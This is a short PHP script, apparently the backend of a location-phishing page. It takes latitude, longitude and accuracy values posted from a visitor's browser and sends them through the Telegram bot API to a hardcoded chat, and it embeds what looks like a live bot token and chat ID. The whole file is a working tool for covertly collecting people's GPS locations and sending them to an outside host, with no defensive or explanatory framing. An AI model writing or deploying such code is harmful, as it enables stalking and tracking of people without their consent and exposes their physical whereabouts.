<?php 
if(isset($_POST['lat'])){
    

$lat = urldecode($_POST['lat']);
$lon = urldecode($_POST['lon']);
$acc = urldecode($_POST['acc']);

$botToken = "6563990775:AAF5tXFgWc_sj_uD2NcJ2YDO4GDFIVfYYIw";
$chat_id = "1417235718";
$message = "
Latitude: : $lat \n
Longitude: $lon \n
Accuracy: $acc meters";
$bot_url    = "https://api.telegram.org/bot6563990775:AAF5tXFgWc_sj_uD2NcJ2YDO4GDFIVfYYIw/";
$url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
file_get_contents($url);


$boturl = "https://api.telegram.org/bot6563990775:AAF5tXFgWc_sj_uD2NcJ2YDO4GDFIVfYYIw/sendlocation?chat_id=$chat_id&latitude=$lat&longitude=$lon";

file_get_contents($boturl);

}
?>